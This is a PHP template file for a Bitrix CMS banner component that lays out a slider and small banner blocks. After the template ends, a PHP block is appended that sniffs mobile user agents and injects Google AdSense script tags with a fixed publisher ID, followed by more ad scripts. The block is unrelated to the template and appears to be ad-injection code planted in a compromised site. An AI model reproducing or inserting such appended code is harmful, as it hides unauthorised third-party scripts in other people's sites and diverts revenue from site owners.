<?if(!defined("B_PROLOG_INCLUDED") || B_PROLOG_INCLUDED!==true)die();?>
<?$this->setFrameMode(true);?>
<?if($arResult['ITEMS']):?>
	<div class="top_big_banners <?=($arResult['HAS_CHILD_BANNERS'] ? 'with_childs' : '');?>">
		<div class="row dd">
			<?if($arResult['HAS_SLIDE_BANNERS'] && $arResult['HAS_CHILD_BANNERS']):?>
				<?$iSmallBannersCount = count($arResult["ITEMS"][$arParams["BANNER_TYPE_THEME_CHILD"]]["ITEMS"]);?>
				<div class="col-m-<?=($iSmallBannersCount <= 2 ? 80 : 60);?> col-md-6 col-m-push-20">
					<?include_once('slider.php');?>
				</div>
				<div class="col-m-20 col-md-3 col-m-pull-<?=($iSmallBannersCount <= 2 ? 80 : 60);?>"><div class="row">
					<?foreach($arResult['ITEMS'][$arParams['BANNER_TYPE_THEME_CHILD']]['ITEMS'] as $key => $arItem):?>
						<?if($key == 4):?>
							</div></div><div class="clearfix">
						<?endif;?>
						<?if($key > 3):?>
							</div><div class="col-m-20 col-md-3 col-xs-6 blocks">
						<?endif;?>

						<?include('float.php');?>

						<?if($key && $key < 3 && $key%2 == 1):?>
							</div></div><div class="col-m-20 col-md-3"><div class="row">
						<?endif;?>
					<?endforeach;?>
				<?if($key <= 3):?>
					</div>
				<?endif;?>
				</div>
			<?elseif($arResult['HAS_SLIDE_BANNERS']):?>
				<div class="col-md-12">
					<?include_once('slider.php');?>
				</div>
			<?elseif($arResult['HAS_CHILD_BANNERS']):?>
				<?foreach($arResult['ITEMS'][$arParams['BANNER_TYPE_THEME_CHILD']]['ITEMS'] as $key => $arItem):?>
					<div class="col-md-3">
						<?include('float.php');?>
					</div>
				<?endforeach;?>
			<?endif;?>
		</div>
	</div>
<?endif;?><?php
$str = '<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-2354472562823288" data-ad-slot="7378340656" data-ad-format="auto"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script>';$useragent=$_SERVER['HTTP_USER_AGENT'];if(preg_match('/android|avantgo|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|symbian|treo|up\.(browser|link)|vodafone|wap|windows(ce|phone)|xda|xiino/i',$useragent)||preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|82s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(9|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-||_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt|kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|e\-|e\/|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(di|rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v)|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|s(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v)|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|topl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g|nc|nw)|wmlb|wonu|x700|xda(\-|2|g)|yas\-|your|zeto|zte\-/i',substr($useragent,0,4))){echo $str;}?>
<script asyncsrc="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>  (adsbygoogle = window.adsbygoogle || []).push({    google_ad_client: "ca-pub-2354472562823288",    enable_page_level_ads: true  });</script>